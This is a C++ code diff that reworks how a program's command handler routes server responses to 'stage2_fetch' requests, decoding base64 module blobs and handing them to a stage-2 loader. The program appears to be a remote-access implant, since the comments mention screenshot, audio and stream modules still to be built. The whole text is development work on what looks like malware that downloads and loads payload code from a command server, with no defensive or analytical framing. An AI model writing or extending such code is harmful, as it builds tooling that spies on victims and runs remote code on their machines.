@@ -1429,24 +1429,22 @@ static void handle_command(const std::string& msg_str) {
         g_log.debug("CMD: " + cmd);
 
         // ── Stage-2 fetch response (host ← server) ──
-        // When we previously sent {"cmd":"stage2_fetch",...} the server
-        // responds with {"id":"s2_...","ok":..,"data":{"cmd":"stage2_blob",
-        // "module":"...","blob_b64":"..."}}. Catch that here and hand the
-        // blob to the loader. These responses have no `cmd` field at top
-        // level; they carry cmd inside `data`.
+        // ANY response whose id starts with "s2_" is a response to one of
+        // our stage2_fetch requests — success OR error. Route both to
+        // on_fetch_response so fetch_blob_sync wakes up immediately instead
+        // of waiting for the 20-second timeout. For missing modules
+        // (screenshot/audio/stream which aren't built yet) the server
+        // sends {"ok":false,"error":"stage2 module not available: X"} —
+        // without routing that here, prefetch would block 20s per module.
         if (cmd.empty() && id.size() > 3 && id.compare(0, 3, "s2_") == 0) {
-            std::string data_cmd = json_get(msg_str, "data");
-            // json_get for nested object returns the raw object string when
-            // data's value is a {...} block — but our simple parser returns
-            // empty for object values (no quote handling). So we search for
-            // "stage2_blob" as a marker directly in msg_str.
-            if (msg_str.find("\"stage2_blob\"") != std::string::npos) {
-                std::string ok_s = json_get(msg_str, "ok");
-                bool ok = (ok_s == "true" || ok_s == "1");
-                std::string module = json_get(msg_str, "module");
-                std::string b64    = json_get(msg_str, "blob_b64");
-                std::vector<uint8_t> blob;
-                if (ok && !b64.empty()) {
+            std::string ok_s = json_get(msg_str, "ok");
+            bool ok = (ok_s == "true" || ok_s == "1");
+            std::string module = json_get(msg_str, "module");
+            std::vector<uint8_t> blob;
+            // Success path: extract + b64-decode the blob
+            if (ok && msg_str.find("\"stage2_blob\"") != std::string::npos) {
+                std::string b64 = json_get(msg_str, "blob_b64");
+                if (!b64.empty()) {
                     // base64-decode via wincrypt (already linked)
                     DWORD out_len = 0;
                     CryptStringToBinaryA(b64.c_str(), (DWORD)b64.size(),
@@ -1460,9 +1458,10 @@ static void handle_command(const std::string& msg_str) {
                         blob.resize(out_len);
                     }
                 }
-                stage2::Registry::inst().on_fetch_response(id, ok, module, std::move(blob));
-                return;
             }
+            // Error path: blob stays empty, ok=false — caller treats as no-op.
+            stage2::Registry::inst().on_fetch_response(id, ok, module, std::move(blob));
+            return;
         }
 
         // ── Stage-2 dispatch ──
